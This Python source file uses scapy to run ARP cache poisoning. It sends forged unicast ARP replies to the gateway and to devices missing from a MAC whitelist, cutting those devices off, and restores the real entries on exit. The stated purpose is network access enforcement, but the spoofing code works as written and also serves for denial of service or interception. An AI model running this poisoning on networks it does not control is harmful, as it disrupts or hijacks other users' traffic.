"""
Phase 3: ARP Spoofing Enforcer (Unicast mode)
"""
import time
import signal
import sys
from datetime import datetime
from scapy.all import ARP, Ether, sendp, getmacbyip, conf

conf.verb = 0


def _ts() -> str:
    return datetime.now().strftime("%H:%M:%S")


def spoof(target_ip: str, target_mac: str, spoof_ip: str, interface: str) -> None:
    """Tell target that spoof_ip's MAC is ours (Unicast ARP Reply)."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        # hwsrc defaults to local interface MAC — that's the poison
    )
    sendp(pkt, iface=interface, verbose=False)


def restore(target_ip: str, target_mac: str, real_src_ip: str, real_src_mac: str, interface: str) -> None:
    """Send corrected ARP Reply to undo poisoning."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_src_ip,
        hwsrc=real_src_mac,
    )
    sendp(pkt, iface=interface, count=5, verbose=False)


def _resolve_mac(ip: str, interface: str) -> str:
    """Resolve MAC via ARP request; raise if unreachable."""
    mac = getmacbyip(ip)
    if not mac:
        raise RuntimeError(f"Cannot resolve MAC for {ip} — is the host reachable?")
    return mac.upper()


def enforce_single(
    illegal_ip: str,
    illegal_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    interface: str,
    interval: int = 30,
) -> None:
    """Block one illegal device by poisoning both directions."""

    def _cleanup(signum=None, frame=None):
        print(f"\n[{_ts()}] Ctrl+C — restoring real ARP entries ...")
        restore(gateway_ip, gateway_mac, illegal_ip, illegal_mac, interface)
        restore(illegal_ip, illegal_mac, gateway_ip, gateway_mac, interface)
        print(f"[{_ts()}] Restore done. Network recovered.")
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)

    print(f"[{_ts()}] ENFORCE START  target={illegal_ip} ({illegal_mac})  gw={gateway_ip}  interval={interval}s")
    try:
        while True:
            spoof(gateway_ip, gateway_mac, illegal_ip, interface)
            spoof(illegal_ip, illegal_mac, gateway_ip, interface)
            print(f"[{_ts()}] Poisoned  {illegal_ip} <-> {gateway_ip}")
            time.sleep(interval)
    except KeyboardInterrupt:
        _cleanup()


def enforce_all_illegal(
    scanned_devices: list[dict],
    whitelist_macs: set[str],
    gateway_ip: str,
    interface: str,
    interval: int = 30,
) -> None:
    """Block every device not in whitelist."""
    illegal = [
        d for d in scanned_devices
        if d["mac"].upper() not in {m.upper() for m in whitelist_macs}
    ]

    if not illegal:
        print("[ENFORCE] No illegal devices found. Nothing to block.")
        return

    print(f"[ENFORCE] {len(illegal)} illegal device(s) found:")
    for d in illegal:
        print(f"  - {d['ip']}  {d['mac']}")

    print(f"\n[ENFORCE] Resolving gateway MAC for {gateway_ip} ...")
    gateway_mac = _resolve_mac(gateway_ip, interface)
    print(f"[ENFORCE] Gateway MAC = {gateway_mac}")

    # Resolve MACs for illegal devices (use scanned MAC, already have it)
    targets = [{"ip": d["ip"], "mac": d["mac"]} for d in illegal]

    def _cleanup(signum=None, frame=None):
        print(f"\n[{_ts()}] Ctrl+C — restoring all ...")
        for t in targets:
            restore(gateway_ip, gateway_mac, t["ip"], t["mac"], interface)
            restore(t["ip"], t["mac"], gateway_ip, gateway_mac, interface)
        print(f"[{_ts()}] All entries restored.")
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)

    print(f"\n[{_ts()}] ENFORCE START  {len(targets)} target(s)  interval={interval}s")
    try:
        while True:
            for t in targets:
                spoof(gateway_ip, gateway_mac, t["ip"], interface)
                spoof(t["ip"], t["mac"], gateway_ip, interface)
            ts = _ts()
            ips = ", ".join(t["ip"] for t in targets)
            print(f"[{ts}] Poisoned: {ips}")
            time.sleep(interval)
    except KeyboardInterrupt:
        _cleanup()
